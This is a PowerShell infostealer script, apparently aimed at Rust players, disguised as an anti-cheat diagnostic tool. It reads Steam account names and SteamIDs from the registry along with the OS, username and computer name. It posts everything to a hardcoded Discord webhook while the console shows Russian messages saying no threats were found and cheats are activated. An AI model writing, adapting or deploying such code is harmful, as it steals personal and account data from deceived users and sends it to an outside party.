# steam_token_harvester.ps1
# Disguised as "Rust Cheat Detection Diagnostic Tool v3.2"

function Get-SteamTokens {
    $tokens = @()
    $steamPath = "HKCU:\Software\Valve\Steam"
    if (Test-Path $steamPath) {
        $users = Get-ChildItem "$steamPath\Users" -Name
        foreach ($user in $users) {
            $loginUsers = Get-ItemProperty -Path "$steamPath\Users\$user" -Name "SteamID" -ErrorAction SilentlyContinue
            if ($loginUsers) {
                $tokens += @{
                    SteamID = $loginUsers.SteamID
                    AccountName = $user
                }
            }
        }
    }
    return $tokens
}

function Get-SystemInfo {
    $sysInfo = @{
        OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        Username = $env:USERNAME
        Computername = $env:COMPUTERNAME
        Date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    }
    return $sysInfo
}

function Send-ToDiscord {
    param($embedObject)
    $webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
    $payload = @{
        username = "System Diagnostic Bot"
        embeds = @($embedObject)
    } | ConvertTo-Json -Depth 10
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
}

# Main execution
Write-Host "Запуск диагностики Rust Anti-Cheat..." -ForegroundColor Yellow

$sysInfo = Get-SystemInfo
$tokens = Get-SteamTokens

# Вывод токенов в консоль для жертвы
Write-Host "`n[INFO] Обнаружены сессии Steam:" -ForegroundColor Cyan
if ($tokens.Count -gt 0) {
    foreach ($token in $tokens) {
        Write-Host ("SteamID: {0} (Аккаунт: {1})" -f $token.SteamID, $token.AccountName) -ForegroundColor White
    }
} else {
    Write-Host "Сессии не обнаружены." -ForegroundColor Yellow
}

Write-Host "`n[INFO] Проверка системной integrity..." -ForegroundColor Cyan

$embed = @{
    title = "Rust Anti-Cheat Diagnostic Report"
    color = "16711680"
    fields = @(
        @{
            name = "System Information"
            value = "OS: $($sysInfo.OS)`nUser: $($sysInfo.Username)`nPC: $($sysInfo.Computername)`nScan Time: $($sysInfo.Date)"
        },
        @{
            name = "Steam Session Tokens Found"
            value = ($tokens | ForEach-Object { "SteamID: $($_.SteamID) (Account: $($_.AccountName))" }) -join "`n"
        },
        @{
            name = "Diagnostic Result"
            value = "No cheat signatures detected. System integrity verified."
        }
    )
}

Send-ToDiscord $embed

Write-Host "`nДиагностика завершена. Угроз не обнаружено." -ForegroundColor Green
Write-Host "Читы успешно активированы!" -ForegroundColor Green
